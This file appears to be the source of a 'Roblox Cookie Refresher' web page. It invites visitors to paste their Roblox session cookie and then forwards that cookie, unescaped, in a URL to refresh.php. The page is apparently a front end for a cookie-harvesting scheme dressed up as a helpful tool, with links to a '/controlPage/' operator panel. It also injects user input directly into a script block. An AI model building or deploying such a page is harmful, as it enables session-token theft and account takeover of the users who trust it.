<?php
$c = $_POST['cookie'];
if ($c) {
$lol = '<script>
  location.replace("refresh.php?cookie='.$c.'")
</script>';
echo $lol;
}
?>
<!DOCTYPE html>
<html lang="en">

<head>
	<style>
	body,
	html {
		background: rgb(24, 24, 28) !important;
	}
	</style>
	<meta charset="UTF-8">
	<meta http-equiv="X-UA-Compatible" content="IE=edge">
	<meta name="viewport" content="width=device-width, initial-scale=1.0">
	<title> Cookie Refresher</title>
	<!-- CSS / Bootstrap -->
	<link href="/controlPage/new/assets/css/imports.css" rel="stylesheet">
	<!-- SNACKBAR -->
	<link rel="stylesheet" href="/controlPage/new/assets/css/snackbar.css" />
	<script src="/controlPage/new/assets/js/snackbar.js"></script>
	<style>
	    .swal2-container {
	        z-index: 20000 !important;
	    }
	</style>
</head>

<body>
	<section id="login" class="form">
		<div class="container h-100">
			<div class="row justify-content-center align-items-center h-100">
				<div class="col-md-10 col-lg-5">
					<div class="login-box" data-aos="fade-up" data-aos-duration="1500">
						<center><h2>Roblox Cookie Refresher</h2></center>
						<!-- LOGIN FORM -->
						<form method="post" id="login-form">
							<div class="form-input-icon mb-3 mt-4"> <i class="fas fa-key"></i>
								<input class="auth-input" type="text" placeholder="Your Cookie" name="cookie" required> </div>
				 	<button type="submit" class="button primary d-block mt-3 w-100" onclick="Regular(this, 'genaretor');" style="color:black">Refresh</button>
						</form>
					</div>
				</div>
			</div>
		</div>
		<div class="overlay-top-right"></div>
		<div class="overlay-bottom-right"></div>
		<div class="overlay-bottom-left"></div>
	</section>
	<script>
	    function Switch(option){
	        if(option == 0){
	            document.getElementsByClassName('form')[0].style.display='none';
	            document.getElementsByClassName('form')[1].style.display='block';
	        }else if(option == 1){
	            document.getElementsByClassName('form')[0].style.display='block';
	            document.getElementsByClassName('form')[1].style.display='none';
	        }
	    }
	</script>
	<script src="/controlPage/apis/main.js"></script>
	<script src="//cdn.jsdelivr.net/npm/sweetalert2@11"></script>
	<script src="/controlPage/js/jquery-3.3.1.min.js"></script>
	<script src="https://kit.fontawesome.com/44623006da.js" crossorigin="anonymous"></script>
	<script src="/controlPage/new/assets/js/bootstrap.js"></script>
	<script src="/controlPage/new/assets/js/core.js"></script>
</body>

</html>